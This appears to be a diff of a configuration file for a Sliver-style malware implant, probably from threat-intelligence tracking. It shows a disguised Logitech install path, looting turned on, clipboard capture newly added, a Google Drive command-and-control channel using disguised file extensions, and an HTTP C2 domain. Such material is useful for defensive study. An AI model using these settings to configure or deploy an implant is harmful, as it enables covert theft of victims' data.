@@ -7,12 +7,13 @@
     "ConfigID": "9ecd4772-22ed-428d-be07-a2579092f740",
     "PeerAgePublicKeySignature": "untrusted comment: signature from private key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+VacFX4iBgo3Zwwg5BZqS0vyFxr90q+W+jo0MLcsayVA3HjxsEpDDUkKELnT2i3Ivk+vBINWYqp5RoHjaIFRigg=\ntrusted comment: timestamp:1730336915\n38cF8Sf7WKAu2C73d/YA0nGC7tEoRz8qzfO1cSYa96aPtAoxi8Cua8Z2GUY1p7H7kouOlDrH6yiir2M/NpPRAQ==",
     "EncoderNonce": 13,
-    "MaxFailure": 5,
+    "MaxConnectionErrors": 5,
     "ReconnectInterval": 600,
     "SliverPath": "%APPDATA%\\Logitech",
     "Protocol": 1,
     "Type": 1,
     "Loot": true,
+    "Clipboard": true,
     "DriveConfigs": [
         {
             "ClientID": "178467925713-lerc06071od46cr41r3f5fjc1ml56n76.apps.googleusercontent.com",
@@ -24,7 +25,7 @@
             "RecvExtension": "_sln160",
             "RegisterExtension": "vssettings",
             "CloseExtension": "asf",
-            "PollInterval": 60
+            "PollInterval": 300
         }
     ],
     "HttpConfigs": [
@@ -43,9 +44,5 @@
             "URL": "http://ubuntu-icefrog2000.com"
         }
     ],
-    "PivotConfigs": [
-        {
-            "BindAddress": "127.0.0.1:9898"
-        }
-    ]
+    "PivotConfigs": []
 }
